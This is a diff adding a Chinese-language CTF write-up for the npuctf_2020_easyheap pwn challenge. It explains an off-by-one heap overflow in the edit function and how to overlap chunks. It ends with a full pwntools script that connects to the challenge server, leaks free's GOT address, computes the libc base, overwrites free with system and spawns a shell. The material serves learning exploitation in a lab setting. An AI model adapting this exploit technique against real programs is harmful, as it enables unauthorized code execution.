@@ -919,3 +919,107 @@ if __name__ == "__main__":
 
     main()
 ```
+
+### npuctf_2020_easyheap
+
+[题目链接](https://buuoj.cn/challenges#npuctf_2020_easyheap)
+
+也是第一个 Ubuntu18.04 的堆题目，但是好像也没有用这个高版本特性。
+
+（但是这道题让我意识到我对单字节溢出的理解沾点问题。）
+
+随便申请两个 chunk 看看，发现是 manage_chunk + user_chunk 模式，manage_chunk 依次放着 0，manage_chunk_size（0x21），user_chunk_user_data_size，user_chunk_user_data首地址。
+
+存储 chunk 头指针的数组在 bss 段上，0x6020A0。
+
+create 函数 `read_input(*(_QWORD *)(*((_QWORD *)&heaparray + i) + 8LL), size);` 无堆溢出。
+
+但是 edit 函数有 `read_input(*(_QWORD *)(*((_QWORD *)&heaparray + n0xA) + 8LL), **((_QWORD **)&heaparray + n0xA) + 1LL);`，这不是单字节溢出吗。
+
+所以现在的思路就是，申请 chunk_0，chunk_1，chunk_2，单字节溢出使 manage_chunk_1 的 manage_chunk_1_size 大小为 0x41，然后 delete 再 create，这样就可以修改 manage_chunk_1 的内容，我们可以使其原本写着 user_chunk_user_data 首地址的位置指向 free_got，然后 show，理论上就可以 ret2libc。
+
+（因为这个题只允许申请 0x20 和 0x40 大小的 chunk）
+
+我之前一直认为这个单字节溢出，应该是包裹 `manage_chunk_1 + user_chunk_1 + manage_chunk_2`，然后修改 manage_chunk_2 的头指针。
+
+但是现在我觉得不太对，其实是新的 user_chunk 占据了过去 1 的编号，比如图下（填入了 8 个 A）
+
+<img width="584" height="244" alt="ae3c13989fb787868f6595288a3dbd46" src="https://github.com/user-attachments/assets/366ca244-5825-43ed-a0fe-2dc8e07e1058" />
+
+那么会发现，过去的 0x40 由以下几个部分构成：
+
+* 0x00 ~ 0x10：前 manage_chunk 的 prev_size 和 size（已经被单字节溢出为 0x40）。
+* 0x10 ~ 0x20：新写入的 user_data 和部分前 manage_chunk 残留的数据（注意我们的 “AAAA” 既然写入这里了，证明新的 manage_chunk 中存储的 user_chunk_user_data 头指针指向这里，所以我们其实不用思考具体的节奏，下面找找哪里填着这里的地址就可以了）
+* 0x20 ~ 0x30：一个经典的 manage_chunk 结构，所以这里是 new_manage_chunk。（溢出路过的时候保持原样）
+
+所以我们把写着 `0x00000000053b82a0` 填上 free_got 就可以了。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 28065
+io = remote(host,port)
+# io = process("./npuctf_2020_easyheap")
+elf = ELF('./npuctf_2020_easyheap')
+libc = ELF("./libc-2.27.so")
+free_got = elf.got['free']
+
+def create(size,content):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b"1")
+    io.recvuntil(b"Size of Heap(0x10 or 0x20 only) : ") # 24 or 56
+    io.sendline(str(size).encode())
+    io.recvuntil(b"Content:")
+    io.send(content)
+
+def edit(index,content):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b"2")
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+    io.recvuntil(b"Content:")
+    io.send(content)
+
+def show(index):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b"3")
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+
+def delete(index):
+    io.recvuntil(b"Your choice :")
+    io.sendline(b"4")
+    io.recvuntil(b"Index :")
+    io.sendline(str(index).encode())
+
+def main():
+    create(24,b'A'*24)  # index 0
+    create(24,b'B'*24)  # index 1
+    create(24,b'C'*24)  # index 2
+    create(24,b'/bin/sh\x00')  # index 3 for guard
+    payload_0 = b'E'*24 + b'\x41' 
+    edit(0,payload_0)
+    delete(1)
+    payload_1 =b'F'*0x10 + p64(0) + p64(0x21) + p64(8) + p64(free_got)
+    create(56,payload_1)  # index 4
+    # gdb.attach(io)
+    show(1)
+    io.recvuntil(b"Content : ")
+    leak_data = io.recvline().strip().ljust(8,b'\x00')
+    free_addr = u64(leak_data)
+    print("\n[+] Leak free address :",hex(free_addr))
+    libc_base = free_addr - libc.sym['free']
+    print("\n[+] Leak libc_base address :",hex(libc_base))
+    system = libc_base + libc.sym['system']
+    print("\n[+] Leak system address :",hex(system))
+    edit(1,p64(system))
+    delete(3)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
